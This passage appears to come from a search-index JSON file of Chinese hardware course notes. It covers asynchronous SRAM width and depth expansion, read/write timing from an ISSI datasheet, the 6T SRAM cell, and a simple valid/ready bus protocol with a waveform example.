SRAM\u3002\u200b\u62fc\u63a5\u200b\u7684\u200b\u65f6\u5019\u200b\u53ef\u4ee5\u200b\u91c7\u7528\u200b\u4e24\u79cd\u200b\u65b9\u5f0f\u200b\uff1a</p> <p>\u200b\u4e00\u79cd\u200b\u662f\u200b\u5728\u200b\u5bbd\u5ea6\u200b\u4e0a\u200b\u62fc\u63a5\u200b\uff0c\u200b\u4f8b\u5982\u200b\u62fc\u63a5\u200b\u4e24\u4e2a\u200b\u76f8\u540c\u200b\u6df1\u5ea6\u200b\u3001\u200b\u5bbd\u5ea6\u200b\u4e3a\u200b 16 \u200b\u7684\u200b\u5f02\u6b65\u200b SRAM\uff0c\u200b\u5f97\u5230\u200b\u4e00\u4e2a\u200b\u5bbd\u5ea6\u200b\u4e3a\u200b 32 \u200b\u7684\u200b\u5f02\u6b65\u200b SRAM\uff1a</p> <p> </p> \u200b\u5728\u200b\u5bbd\u5ea6\u200b\u4e0a\u200b\u62fc\u63a5\u200b\u5f02\u6b65\u200b SRAM <p>\u200b\u5730\u5740\u200b\u4fe1\u53f7\u200b\uff08A\uff09\u200b\u548c\u200b\u63a7\u5236\u200b\u4fe1\u53f7\u200b\uff08OE#\u3001WE#\u3001CE#\uff09\u200b\u8fde\u63a5\u200b\u5230\u200b\u6240\u6709\u200b\u5f02\u6b65\u200b SRAM\uff0c\u200b\u6570\u636e\u4fe1\u53f7\u200b\uff08DQ\uff09\u200b\u548c\u200b\u5b57\u8282\u200b\u4f7f\u80fd\u200b\u4fe1\u53f7\u200b\uff08WE0-3#\uff09\u200b\u5219\u200b\u8fde\u63a5\u200b\u5230\u200b\u4e0d\u540c\u200b\u7684\u200b\u5f02\u6b65\u200b SRAM\uff0c\u200b\u5f62\u6210\u200b\u4e24\u500d\u200b\u7684\u200b\u6570\u636e\u200b\u5bbd\u5ea6\u200b\u3002</p> <p>\u200b\u53e6\u200b\u4e00\u79cd\u200b\u662f\u200b\u5728\u200b\u6df1\u5ea6\u200b\u4e0a\u200b\u62fc\u63a5\u200b\uff0c\u200b\u4fdd\u6301\u200b\u5bbd\u5ea6\u200b\u4e0d\u53d8\u200b\uff0c\u200b\u589e\u52a0\u200b\u5b58\u50a8\u5bb9\u91cf\u200b\u3002\u200b\u4f8b\u5982\u200b\u62fc\u63a5\u200b\u4e24\u4e2a\u200b\u5f02\u6b65\u200b SRAM\uff0c\u200b\u5f97\u5230\u200b\u4e00\u4e2a\u200b\u6df1\u5ea6\u200b\u7ffb\u500d\u200b\u7684\u200b\u5f02\u6b65\u200b SRAM\u3002\u200b\u6bcf\u6b21\u200b\u8bbf\u95ee\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ea\u4f1a\u200b\u8bbf\u95ee\u200b\u5176\u4e2d\u200b\u4e00\u4e2a\u200b\u5f02\u6b65\u200b SRAM\uff0c\u200b\u901a\u8fc7\u200b\u5730\u5740\u200b\u6765\u200b\u533a\u5206\u200b\u3002</p> <p>\u200b\u4f8b\u5982\u200b\u8981\u200b\u62fc\u63a5\u200b\u4e24\u4e2a\u200b 21 \u200b\u4f4d\u200b\u5730\u5740\u200b\u7684\u200b\u5f02\u6b65\u200b SRAM\uff0c\u200b\u5f97\u5230\u200b\u4e00\u4e2a\u200b 22 \u200b\u4f4d\u200b\u5730\u5740\u200b\u7684\u200b\u5f02\u6b65\u200b SRAM\uff0c\u200b\u5982\u679c\u200b\u7528\u200b\u5730\u5740\u200b\u7684\u200b\u6700\u9ad8\u200b\u4f4d\u6765\u200b\u9009\u62e9\u200b\u8bbf\u95ee\u200b\u54ea\u4e2a\u200b\u5f02\u6b65\u200b SRAM\uff0c\u200b\u90a3\u4e48\u200b\u53ef\u4ee5\u200b\u8bbe\u5b9a\u200b\uff1a<code>CS0#=CS# | A[21], CS1#=CS# | ~A[21]</code>\uff0c\u200b\u5176\u4f59\u200b\u7684\u200b\u4fe1\u53f7\u200b\u90fd\u200b\u8fde\u63a5\u200b\u5230\u200b\u6240\u6709\u200b\u7684\u200b\u5f02\u6b65\u200b SRAM\u3002\u200b\u7531\u4e8e\u200b\u5f02\u6b65\u200b SRAM \u200b\u5728\u200b <code>CS#=1</code> \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u8f93\u51fa\u200b\u5f15\u811a\u200b\u5904\u4e8e\u200b\u9ad8\u200b\u963b\u6001\u200b\u72b6\u6001\u200b\uff0c\u200b\u6240\u4ee5\u200b\u591a\u4e2a\u200b\u82af\u7247\u200b\u53ef\u4ee5\u200b\u5171\u4eab\u200b\u4e00\u4e2a\u200b\u6570\u636e\u603b\u7ebf\u200b\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\u4fdd\u8bc1\u200b\u603b\u7ebf\u200b\u4e0a\u200b\u540c\u65f6\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\u82af\u7247\u200b\u5728\u200b\u8f93\u51fa\u200b\uff1a</p> <p> </p> \u200b\u5728\u200b\u6df1\u5ea6\u200b\u4e0a\u200b\u62fc\u63a5\u200b\u5f02\u6b65\u200b SRAM <p>\u200b\u5b9e\u8df5\u200b\u4e2d\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6df7\u5408\u200b\u4e24\u79cd\u200b\u62fc\u63a5\u200b\u65b9\u6cd5\u200b\u3002</p>"},{"location":"hardware/async_sram.html#_5","title":"\u65f6\u5e8f","text":""},{"location":"hardware/async_sram.html#_6","title":"\u8bfb\u200b\u65f6\u5e8f","text":"<p>\u200b\u5f02\u6b65\u200b SRAM \u200b\u4e4b\u6240\u4ee5\u200b\u53eb\u505a\u200b\u5f02\u6b65\u200b\uff0c\u200b\u662f\u56e0\u4e3a\u200b\u5b83\u200b\u6ca1\u6709\u200b\u65f6\u949f\u200b\u4fe1\u53f7\u200b\u3002\u200b\u6b64\u65f6\u200b\u8bfb\u200b\u65f6\u5e8f\u200b\u4f53\u73b0\u200b\u4e3a\u200b\uff0c\u200b\u63a7\u5236\u5668\u200b\u7ed9\u51fa\u200b\u5730\u5740\u200b\uff0c\u200b\u5230\u200b\u5f02\u6b65\u200b SRAM \u200b\u7ed9\u51fa\u200b\u6570\u636e\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u3002\u200b\u4ee5\u200b IS61/64WV204816ALL \u200b\u5f02\u6b65\u200b SRAM \u200b\u82af\u7247\u200b \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u8bfb\u200b\u65f6\u5e8f\u200b\u89c1\u200b\u4e0b\u56fe\u200b\uff1a</p> <p> </p> \u200b\u5f02\u6b65\u200b SRAM \u200b\u8bfb\u200b\u65f6\u5e8f\u200b\uff08\u200b\u56fe\u6e90\u200b ISSI Datasheet\uff09 <ul> <li>\\(t_{RC}\\)\uff1a\u200b\u8bfb\u200b\u5468\u671f\u65f6\u95f4\u200b\uff0c\u200b\u8fd9\u200b\u6bb5\u65f6\u95f4\u200b\u5185\u200b\u5730\u5740\u200b\u4e0d\u53d8\u200b\uff0cMin 10ns</li> <li>\\(t_{AA}\\)\uff1a\u200b\u5730\u5740\u200b\u8bbf\u95ee\u200b\u65f6\u95f4\u200b\uff0c\u200b\u6570\u636e\u200b\u5728\u200b\u5730\u5740\u200b\u6539\u53d8\u200b\u540e\u200b \\(t_{AA}\\) \u200b\u65f6\u95f4\u200b\u7ed9\u51fa\u200b\uff0cMax 10ns</li> <li>\\(t_{OHA}\\)\uff1aOutput Hold \u200b\u65f6\u95f4\u200b\uff0c\u200b\u8fd9\u200b\u6bb5\u65f6\u95f4\u200b\u5185\u200b\u6570\u636e\u200b\u4e0d\u53d8\u200b\uff0cMin 2.5ns</li> </ul> <p>\u200b\u5728\u200b \\(t_{OHA}\\) \u200b\u7ed3\u675f\u200b\u5230\u200b \\(t_{AA}\\) \u200b\u7ed3\u675f\u200b\u4e2d\u95f4\u200b\u7684\u200b\u8fd9\u200b\u6bb5\u65f6\u95f4\u200b\uff0c\u200b\u8f93\u51fa\u200b\u6570\u636e\u200b\u662f\u200b\u4e0d\u200b\u786e\u5b9a\u200b\u7684\u200b\u3002</p>"},{"location":"hardware/async_sram.html#_7","title":"\u5199\u200b\u65f6\u5e8f","text":"<p>\u200b\u5199\u200b\u65f6\u5e8f\u200b\u5219\u200b\u6bd4\u8f83\u590d\u6742\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53ef\u4ee5\u200b\u6709\u200b\u591a\u79cd\u200b\u5199\u5165\u200b\u7684\u200b\u6761\u4ef6\u200b\uff0c\u200b\u4e0b\u9762\u200b\u5217\u51fa\u200b\u5176\u4e2d\u200b\u4e00\u79cd\u200b\uff1a</p> <p> </p> \u200b\u5f02\u6b65\u200b SRAM \u200b\u5199\u200b\u65f6\u5e8f\u200b\uff08\u200b\u56fe\u6e90\u200b ISSI Datasheet\uff09 <p>\u200b\u5199\u200b\u65f6\u5e8f\u200b\u4e2d\u200b\u6bd4\u8f83\u200b\u6838\u5fc3\u200b\u7684\u200b\u662f\u200b <code>WE#</code> \u200b\u7684\u200b\u4e0a\u5347\u200b\u6cbf\u200b\uff0c\u200b\u76f8\u5bf9\u200b\u8fd9\u4e2a\u200b\u65f6\u95f4\u200b\u70b9\u200b\uff0c\u200b\u6709\u200b\u5982\u4e0b\u200b\u6bd4\u8f83\u200b\u91cd\u8981\u200b\u65f6\u5e8f\u200b\u8981\u6c42\u200b\uff1a</p> <ul> <li>\\(t_{WC}\\)\uff1a\u200b\u5730\u5740\u200b\u9700\u8981\u200b\u4fdd\u6301\u200b \\(t_{WC}\\) \u200b\u7684\u200b\u65f6\u95f4\u200b\u4e0d\u53d8\u200b\uff0cMin 10ns</li> <li>\\(t_{AW}\\)\uff1a\u200b\u5730\u5740\u200b\u76f8\u5bf9\u200b <code>WE#</code> \u200b\u7684\u200b\u4e0a\u5347\u200b\u6cbf\u200b\u7684\u200b Setup \u200b\u65f6\u95f4\u200b\uff0cMin 8ns</li> <li>\\(t_{HA}\\)\uff1a\u200b\u5730\u5740\u200b\u76f8\u5bf9\u200b <code>WE#</code> \u200b\u7684\u200b\u4e0a\u5347\u200b\u6cbf\u200b\u7684\u200b Hold \u200b\u65f6\u95f4\u200b\uff0cMin 0ns</li> <li>\\(t_{PWE}\\)\uff1a<code>WE#</code> \u200b\u7ef4\u6301\u200b 0 \u200b\u7684\u200b\u65f6\u95f4\u200b\uff0cMin 8ns</li> <li>\\(t_{SD}\\)\uff1a\u200b\u6570\u636e\u200b\u76f8\u5bf9\u200b <code>WE#</code> \u200b\u7684\u200b\u4e0a\u5347\u200b\u6cbf\u200b\u7684\u200b Setup \u200b\u65f6\u95f4\u200b\uff0cMin 6ns</li> <li>\\(t_{HD}\\)\uff1a\u200b\u6570\u636e\u200b\u76f8\u5bf9\u200b <code>WE#</code> \u200b\u7684\u200b\u4e0a\u5347\u200b\u6cbf\u200b\u7684\u200b Hold \u200b\u65f6\u95f4\u200b\uff0cMin 0ns</li> <li>\\(t_{SA}\\)\uff1a\u200b\u5730\u5740\u200b\u76f8\u5bf9\u200b <code>WE#</code> \u200b\u7684\u200b\u4e0b\u964d\u200b\u6cbf\u200b\u7684\u200b Setup \u200b\u65f6\u95f4\u200b\uff0cMin 0ns</li> </ul>"},{"location":"hardware/async_sram.html#sram-cell","title":"SRAM Cell","text":"<p>\u200b\u5178\u578b\u200b\u7684\u200b SRAM Cell \u200b\u7531\u200b 6 \u200b\u4e2a\u200b\u6676\u4f53\u7ba1\u200b\u7ec4\u6210\u200b\uff0c\u200b\u5185\u90e8\u200b\u6784\u9020\u200b\u5982\u4e0b\u200b\u56fe\u200b\uff1a</p> <p> </p> 6T SRAM Cell \u200b\u5185\u90e8\u200b\u6784\u9020\u200b\uff08\u200b\u56fe\u6e90\u200b Berkeley EECS 151/251A Spring 2019\uff09 <p>\u200b\u5176\u4e2d\u200b M1 \u200b\u548c\u200b M2 \u200b\u7ec4\u6210\u200b\u4e00\u4e2a\u200b Inverter\uff0cM3 \u200b\u548c\u200b M4 \u200b\u7ec4\u6210\u200b\u4e00\u4e2a\u200b Inverter\uff0c\u200b\u4e24\u4e2a\u200b Inverter \u200b\u7ec4\u6210\u200b\u4e0b\u9762\u200b\u7684\u200b\u7b49\u4ef7\u200b\u7535\u8def\u200b\uff1a</p> <p> </p> SRAM Cell \u200b\u7684\u200b\u7535\u8def\u200b\uff08\u200b\u56fe\u6e90\u200b Berkeley EECS 151/251A Spring 2019\uff09 <p>\u200b\u8fd9\u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b latch\uff0c\u200b\u53ef\u4ee5\u200b\u7a33\u5b9a\u200b\u5730\u200b\u4fdd\u5b58\u200b 1 bit \u200b\u7684\u200b\u6570\u636e\u200b\u3002M5 \u200b\u548c\u200b M6 \u200b\u4e24\u4e2a\u200b\u6676\u4f53\u7ba1\u200b\u662f\u200b\u7528\u6765\u200b\u5b9e\u73b0\u200b\u8bfb\u200b\u548c\u200b\u5199\u200b\u7684\u200b\u3002\u200b\u5f53\u200b WL \u200b\u4f7f\u80fd\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cM5 \u200b\u548c\u200b M6 \u200b\u5bfc\u901a\u200b\uff0c\u200b\u6b64\u65f6\u200b BL \u200b\u548c\u200b Q \u200b\u5bfc\u901a\u200b\uff0cBLbar \u200b\u548c\u200b Qbar \u200b\u5bfc\u901a\u200b\u3002\u200b\u6b64\u65f6\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b BL \u200b\u548c\u200b BLbar \u200b\u8fdb\u884c\u200b\u8bfb\u5199\u200b\u3002</p>"},{"location":"hardware/bus_protocol.html","title":"\u603b\u7ebf\u200b\u534f\u8bae","text":""},{"location":"hardware/bus_protocol.html#_2","title":"\u529f\u80fd","text":"<p>\u200b\u603b\u7ebf\u200b\u901a\u5e38\u200b\u7528\u4e8e\u200b\u8fde\u63a5\u200b CPU \u200b\u548c\u200b\u5916\u8bbe\u200b\uff08\u200b\u5305\u62ec\u200b\u5185\u5b58\u200b\uff09\uff0c\u200b\u4e3a\u4e86\u200b\u66f4\u597d\u200b\u7684\u200b\u517c\u5bb9\u6027\u200b\u548c\u200b\u53ef\u200b\u590d\u7528\u200b\u6027\u200b\uff0c\u200b\u80fd\u5426\u200b\u8bbe\u8ba1\u200b\u4e00\u4e2a\u200b\u7edf\u4e00\u200b\u7684\u200b\u534f\u8bae\u200b\uff0c\u200b\u5176\u4e2d\u200b CPU \u200b\u5b9e\u73b0\u200b\u7684\u200b\u662f\u200b\u53d1\u8d77\u200b\u8bf7\u6c42\u200b\u7684\u200b\u4e00\u65b9\u200b\uff08\u200b\u53c8\u200b\u79f0\u4e3a\u200b master\uff09\uff0c\u200b\u5916\u8bbe\u200b\u5b9e\u73b0\u200b\u7684\u200b\u662f\u200b\u63a5\u6536\u200b\u8bf7\u6c42\u200b\u7684\u200b\u4e00\u65b9\u200b\uff08\u200b\u53c8\u200b\u79f0\u4e3a\u200b slave\uff09\uff0c\u200b\u90a3\u4e48\u200b\u5982\u679c\u200b\u8981\u200b\u6dfb\u52a0\u200b\u5916\u8bbe\u200b\u3001\u200b\u6216\u8005\u200b\u66ff\u6362\u200b CPU \u200b\u5b9e\u73b0\u200b\uff0c\u200b\u90fd\u200b\u4f1a\u200b\u53d8\u5f97\u200b\u6bd4\u8f83\u7b80\u5355\u200b\uff0c\u200b\u51cf\u5c11\u200b\u4e86\u200b\u8bb8\u591a\u200b\u9002\u914d\u200b\u7684\u200b\u5de5\u4f5c\u91cf\u200b\u3002</p> <p>\u200b\u4e00\u4e2a\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u9700\u8981\u200b\u5305\u62ec\u200b\u54ea\u4e9b\u200b\u5185\u5bb9\u200b\uff1f\u200b\u5bf9\u4e8e\u200b CPU \u200b\u6765\u8bf4\u200b\uff0c\u200b\u7a0b\u5e8f\u200b\u4f1a\u200b\u8bfb\u5199\u200b\u5185\u5b58\u200b\uff0c\u200b\u8bfb\u5199\u200b\u5185\u5b58\u200b\u5c31\u200b\u9700\u8981\u200b\u5c06\u200b\u4ee5\u4e0b\u200b\u51e0\u4e2a\u200b\u4fe1\u53f7\u200b\u4f20\u8f93\u200b\u5230\u200b\u5185\u5b58\u200b\uff1a</p> <ol> <li>\u200b\u5730\u5740\u200b\uff08<code>addr</code>\uff09\uff1a\u200b\u4f8b\u5982\u200b 32 \u200b\u4f4d\u200b\u5730\u5740\u200b</li> <li>\u200b\u6570\u636e\u200b\uff08<code>w_data</code> \u200b\u548c\u200b <code>r_data</code>\uff09\uff1a\u200b\u5206\u522b\u200b\u662f\u200b\u5199\u200b\u6570\u636e\u200b\u548c\u200b\u8bfb\u6570\u636e\u200b\uff0c\u200b\u5bbd\u5ea6\u200b\u901a\u5e38\u200b\u4e3a\u200b 32 \u200b\u4f4d\u200b\u6216\u200b 64 \u200b\u4f4d\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u65f6\u949f\u200b\u5468\u671f\u200b\u53ef\u4ee5\u200b\u4f20\u8f93\u200b\u7684\u200b\u6570\u636e\u91cf\u200b</li> <li>\u200b\u8bfb\u200b\u8fd8\u662f\u200b\u5199\u200b\uff08<code>we</code>\uff09\uff1a\u200b\u9ad8\u200b\u8868\u793a\u200b\u5199\u200b\uff0c\u200b\u4f4e\u200b\u8868\u793a\u200b\u8bfb\u200b</li> <li>\u200b\u5b57\u8282\u200b\u6709\u6548\u200b\uff08<code>be</code>\uff09\uff1a\u200b\u4f8b\u5982\u200b\u4e3a\u4e86\u200b\u5b9e\u73b0\u200b\u5355\u5b57\u8282\u200b\u5199\u200b\uff0c\u200b\u867d\u7136\u200b <code>w_data</code> \u200b\u53ef\u80fd\u200b\u662f\u200b 32 \u200b\u4f4d\u200b\u5bbd\u200b\uff0c\u200b\u4f46\u662f\u200b\u5b9e\u9645\u200b\u5199\u5165\u200b\u7684\u200b\u662f\u200b\u5176\u4e2d\u200b\u7684\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b</li> </ol> <p>\u200b\u9664\u4e86\u200b\u8bf7\u6c42\u200b\u7684\u200b\u5185\u5bb9\u200b\u4ee5\u5916\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u8868\u793a\u200b CPU \u200b\u60f3\u8981\u200b\u53d1\u9001\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u8fd8\u200b\u9700\u8981\u200b\u6dfb\u52a0\u200b <code>valid</code> \u200b\u4fe1\u53f7\u200b\uff1a\u200b\u9ad8\u200b\u8868\u793a\u200b\u53d1\u9001\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u4f4e\u200b\u8868\u793a\u200b\u4e0d\u200b\u53d1\u9001\u200b\u8bf7\u6c42\u200b\u3002\u200b\u5f88\u591a\u200b\u65f6\u5019\u200b\uff0c\u200b\u5916\u8bbe\u200b\u7684\u200b\u901f\u5ea6\u200b\u6bd4\u8f83\u6162\u200b\uff0c\u200b\u53ef\u80fd\u200b\u65e0\u6cd5\u200b\u4fdd\u8bc1\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u5904\u7406\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5916\u8bbe\u200b\u53ef\u4ee5\u200b\u63d0\u4f9b\u200b\u4e00\u4e2a\u200b <code>ready</code> \u200b\u4fe1\u53f7\u200b\uff1a\u200b\u5f53\u200b <code>valid=1 &amp;&amp; ready=1</code> \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53d1\u9001\u200b\u5e76\u200b\u5904\u7406\u200b\u8bf7\u6c42\u200b\uff1b\u200b\u5f53\u200b <code>valid=1 &amp;&amp; ready=0</code> \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u8868\u793a\u200b\u5916\u8bbe\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u51c6\u5907\u200b\u597d\u200b\uff0c\u200b\u6b64\u65f6\u200b CPU \u200b\u9700\u8981\u200b\u4e00\u76f4\u200b\u4fdd\u6301\u200b <code>valid=1</code> \u200b\u4e0d\u53d8\u200b\uff0c\u200b\u7b49\u5230\u200b\u5916\u8bbe\u200b\u51c6\u5907\u200b\u597d\u540e\u200b\uff0c<code>valid=1 &amp;&amp; ready=1</code> \u200b\u8bf7\u6c42\u200b\u751f\u6548\u200b\u3002</p>"},{"location":"hardware/bus_protocol.html#_3","title":"\u7b80\u6613\u200b\u603b\u7ebf\u200b\u534f\u8bae","text":"<p>\u200b\u7ed3\u5408\u200b\u4e0a\u6587\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8bbe\u8ba1\u200b\u4e00\u4e2a\u200b\u7b80\u6613\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\uff0c\u200b\u5206\u522b\u200b\u5f97\u5230\u200b master \u200b\u548c\u200b slave \u200b\u7aef\u7684\u200b\u4fe1\u53f7\u200b\u5217\u8868\u200b\u3002\u200b\u7ea6\u5b9a\u200b\u5728\u200b\u547d\u540d\u200b\u7684\u200b\u65f6\u5019\u200b\u7528\u200b <code>_o</code> \u200b\u8868\u793a\u200b\u8f93\u51fa\u200b\u3001<code>_i</code> \u200b\u8868\u793a\u200b\u8f93\u5165\u200b\uff0c\u200b\u90a3\u4e48\u200b master \u200b\u7aef\u200b\uff08CPU \u200b\u7aef\u200b\uff09\u200b\u7684\u200b\u4fe1\u53f7\u200b\uff1a</p> <ol> <li><code>clock_i</code>\uff1a\u200b\u65f6\u949f\u200b\u8f93\u5165\u200b</li> <li><code>valid_o</code>\uff1a\u200b\u9ad8\u200b\u8868\u793a\u200b master \u200b\u60f3\u8981\u200b\u53d1\u9001\u200b\u8bf7\u6c42\u200b</li> <li><code>ready_i</code>\uff1a\u200b\u9ad8\u200b\u8868\u793a\u200b slave \u200b\u51c6\u5907\u200b\u597d\u200b\u5904\u7406\u200b\u8bf7\u6c42\u200b</li> <li><code>addr_o</code>\uff1amaster \u200b\u60f3\u8981\u200b\u8bfb\u5199\u200b\u7684\u200b\u5730\u5740\u200b</li> <li><code>we_o</code>\uff1amaster \u200b\u60f3\u8981\u200b\u8bfb\u200b\u8fd8\u662f\u200b\u5199\u200b</li> <li><code>data_o</code>\uff1amaster \u200b\u60f3\u8981\u200b\u5199\u5165\u200b\u7684\u200b\u6570\u636e\u200b</li> <li><code>be_o</code>\uff1amaster \u200b\u8bfb\u5199\u200b\u7684\u200b\u5b57\u8282\u200b\u4f7f\u80fd\u200b\uff0c\u200b\u7528\u4e8e\u200b\u5b9e\u73b0\u200b\u5355\u5b57\u8282\u200b\u5199\u200b\u7b49\u200b</li> <li><code>data_i</code>\uff1aslave \u200b\u63d0\u4f9b\u200b\u7ed9\u200b master \u200b\u7684\u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b</li> </ol> <p>\u200b\u9664\u4e86\u200b\u65f6\u949f\u200b\u90fd\u200b\u662f\u200b\u8f93\u5165\u200b\u4ee5\u5916\u200b\uff0c\u200b\u628a\u200b\u4e0a\u9762\u200b\u5176\u4f59\u200b\u7684\u200b\u4fe1\u53f7\u200b\u8f93\u5165\u200b\u3001\u200b\u8f93\u51fa\u200b\u5bf9\u79f0\u200b\u4e00\u4e0b\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b slave \u200b\u7aef\u200b\uff08\u200b\u5916\u8bbe\u200b\u7aef\u200b\uff09\u200b\u7684\u200b\u4fe1\u53f7\u200b\uff1a</p> <ol> <li><code>clock_i</code>\uff1a\u200b\u65f6\u949f\u200b\u8f93\u5165\u200b</li> <li><code>valid_i</code>\uff1a\u200b\u9ad8\u200b\u8868\u793a\u200b master \u200b\u60f3\u8981\u200b\u53d1\u9001\u200b\u8bf7\u6c42\u200b</li> <li><code>ready_o</code>\uff1a\u200b\u9ad8\u200b\u8868\u793a\u200b slave \u200b\u51c6\u5907\u200b\u597d\u200b\u5904\u7406\u200b\u8bf7\u6c42\u200b</li> <li><code>addr_i</code>\uff1amaster \u200b\u60f3\u8981\u200b\u8bfb\u5199\u200b\u7684\u200b\u5730\u5740\u200b</li> <li><code>we_i</code>\uff1amaster \u200b\u60f3\u8981\u200b\u8bfb\u200b\u8fd8\u662f\u200b\u5199\u200b</li> <li><code>data_i</code>\uff1amaster \u200b\u60f3\u8981\u200b\u5199\u5165\u200b\u7684\u200b\u6570\u636e\u200b</li> <li><code>be_i</code>\uff1amaster \u200b\u8bfb\u5199\u200b\u7684\u200b\u5b57\u8282\u200b\u4f7f\u80fd\u200b\uff0c\u200b\u7528\u4e8e\u200b\u5b9e\u73b0\u200b\u5355\u5b57\u8282\u200b\u5199\u200b\u7b49\u200b</li> <li><code>data_o</code>\uff1aslave \u200b\u63d0\u4f9b\u200b\u7ed9\u200b master \u200b\u7684\u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b</li> </ol> <p>\u200b\u4ee5\u200b\u4e0a\u9762\u200b\u7684\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u7ed8\u5236\u200b\u51fa\u200b\u4e00\u4e2a\u200b\u53ef\u80fd\u200b\u7684\u200b\u6ce2\u5f62\u56fe\u200b\uff08\u200b\u4ee5\u200b master \u200b\u7684\u200b\u4fe1\u53f7\u200b\u4e3a\u4f8b\u200b\uff09\uff1a</p> \u200b\u7b80\u6613\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u7684\u200b\u6ce2\u5f62\u56fe\u200b <ul> <li><code>a</code> \u200b\u5468\u671f\u200b\uff1a\u200b\u6b64\u65f6\u200b <code>valid_o=1 &amp;&amp; ready_i=1</code> \u200b\u8bf4\u660e\u200b\u6709\u200b\u8bf7\u6c42\u200b\u53d1\u751f\u200b\uff0c\u200b\u6b64\u65f6\u200b <code>we_o=1</code> \u200b\u8bf4\u660e\u200b\u662f\u200b\u4e00\u4e2a\u200b\u5199\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5199\u5165\u200b\u5730\u5740\u200b\u662f\u200b <code>addr_o=0x01</code>\uff0c\u200b\u5199\u5165\u200b\u7684\u200b\u6570\u636e\u200b\u662f\u200b <code>data_o=0x12</code></li> <li><code>b</code> \u200b\u5468\u671f\u200b\uff1a\u200b\u6b64\u65f6\u200b <code>valid_o=0 &amp;&amp; ready_i=0</code> \u200b\u8bf4\u660e\u200b\u65e0\u200b\u4e8b\u200b\u53d1\u751f\u200b</li> <li><code>c</code> \u200b\u5468\u671f\u200b\uff1a\u200b\u6b64\u65f6\u200b <code>valid_o=1 &amp;&amp; ready_i=0</code> \u200b\u8bf4\u660e\u200b master \u200b\u60f3\u8981\u200b\u4ece\u200b\u5730\u5740\u200b 0x02\uff08<code>addr_o=0x02</code>\uff09\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff08<code>we_o=0</code>\uff09\uff0c\u200b\u4f46\u662f\u200b slave \u200b\u6ca1\u6709\u200b\u63a5\u53d7\u200b\uff08<code>ready_i=0</code>\uff09</li> <li><code>d</code> \u200b\u5468\u671f\u200b\uff1a\u200b\u6b64\u65f6\u200b <code>valid_o=1 &amp;&amp; ready_i=1</code> \u200b\u8bf4\u660e\u200b\u6709\u200b\u8bf7\u6c42\u200b\u53d1\u751f\u200b\uff0cmaster \u200b\u4ece\u200b\u5730\u5740\u200b 0x02\uff08<code>addr_o=0x02</code>\uff09\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff08<code>we_o=0</code>\uff09\uff0c\u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b\u4e3a\u200b 0x34\uff08<code>data_i=0x34</code>\uff09</li> <li><code>e</code> \u200b\u5468\u671f\u200b\uff1a\u200b\u6b64\u65f6\u200b <code>valid_o=0 &amp;&amp; ready_i=0</code> \u200b\u8bf4\u660e\u200b\u65e0\u200b\u4e8b\u200b\u53d1\u751f\u200b</li> <li><code>f</code> \u200b\u5468\u671f\u200b\uff1a\u200b\u6b64\u65f6\u200b <code>valid_o=1 &amp;&amp; ready_i=1</code> \u200b\u8bf4\u660e\u200b\u6709\u200b\u8bf7\u6c42\u200b\u53d1\u751f\u200b\uff0cmaster \u200b\u5411\u200b\u5730\u5740\u200b 0x03\uff08<code>addr_o=0x03</code>\uff09\u200b\u5199\u5165\u200b\u6570\u636e\u200b\uff08<code>we_o=1</code>\uff09\uff0c\u200b\u5199\u5165\u200b\u7684\u200b\u6570\u636e\u200b\u4e3a\u200b 0x56\uff08<code>data_i=0x56</code>\uff09</li> <li><code>g</code> \u200b\u5468\u671f\u200b\uff1a\u200b\u6b64\u65f6\u200b <code>valid_o=1 &amp;&amp; ready_i=1</code> \u200b\u8bf4\u660e\u200b\u6709\u200b\u8bf7\u6c42\u200b\u53d1\u751f\u200b\uff0cmaster \u200b\u4ece\u200b\u5730\u5740\u200b 0x01\uff08<code>addr_o=0x01</code>\uff09\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff08<code>we_o=0</code>\uff09\uff0c\u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b\u4e3a\u200b 0x12\uff08<code>data_i=0x12</code>\uff09</li> <li><code>h</code> \u200b\u5468\u671f\u200b\uff1a\u200b\u6b64\u65f6\u200b <code>valid_o=1 &amp;&amp; ready_i=1</code> \u200b\u8bf4\u660e\u200b\u6709\u200b\u8bf7\u6c42\u200b\u53d1\u751f\u200b\uff0cmaster \u200b\u5411\u200b\u5730\u5740\u200b 